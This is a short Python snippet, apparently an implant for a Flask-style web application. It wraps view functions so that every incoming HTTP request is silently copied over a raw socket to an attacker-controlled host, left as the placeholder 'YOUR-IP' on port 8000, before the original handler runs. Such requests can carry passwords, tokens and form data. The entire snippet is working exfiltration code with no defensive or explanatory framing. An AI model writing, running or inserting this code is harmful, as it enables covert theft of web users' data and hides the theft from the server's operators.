def exfiltrate_data(request):
    HOME_IP = "YOUR-IP"
    HOME_PORT = "8000"
    try:
        import socket
        s = socket.socket()
        s.settimeout(10)
        s.connect((HOME_IP, int(HOME_PORT)))
        s.sendall(request._get_current_object().get_data())
        s.close()
    except Exception as err:
        print(f"[!] Failed to send request : {repr(err)}")

def new_http_view_func_wrapper(function, request):
    def view_func(path):
        exfiltrate_data(request)
        return function(request._get_current_object())
    
    return view_func